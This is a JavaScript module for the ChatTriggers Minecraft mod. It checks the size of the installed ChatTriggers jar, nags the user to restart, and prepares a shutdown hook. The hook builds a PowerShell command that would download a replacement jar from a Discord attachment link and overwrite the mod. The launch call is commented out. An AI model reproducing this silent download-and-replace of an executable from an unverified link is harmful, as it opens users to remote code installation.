import { chat } from "../utils/utils"

const Runtime = Java.type("java.lang.Runtime")
const File = Java.type("java.io.File")
const ProcessBuilder = Java.type("java.lang.ProcessBuilder")

const check = () => {
    const ctFile = new File("./mods").list().find(fileName => /.*(?:ctjs|chattriggers).*/.test(fileName))
    if (!ctFile) return chat(`Can't find ChatTriggers mod jar. Report this please thanks`)
    const fileSize = new File(`./mods/${ctFile}`).length()
    if (fileSize === 4162916) return

    register("worldLoad", () => { // Be as annoying as possible
        chat("Restart your game for modules using ASM to work. Your game will crash otherwise.")
    })

    console.warn("Replacing ChatTriggers jar on shutdown.")
    Runtime.getRuntime().addShutdownHook(new java.lang.Thread(() => replaceChatTriggersJar()))

    const replaceChatTriggersJar = () => {
        const url = "https://cdn.discordapp.com/attachments/1365648184067620976/1395032086414622760/ctjs-2.2.1-1.8.9.jar?ex=6878f85f&is=6877a6df&hm=999678006eea186a5903b0396eed4bbc4b13cec88d317e7e49dedbf47a4e9721&"
        new ProcessBuilder(
            "powershell.exe",
            "-Command",
            "Invoke-WebRequest -Uri '" + url + "' -OutFile '" + path() + "\\mods\\" + ctFile + "'"
        ) // .start()
    }

}
check()



function path() {
    const System = Java.type("java.lang.System")
    return System.getProperty("user.dir")
}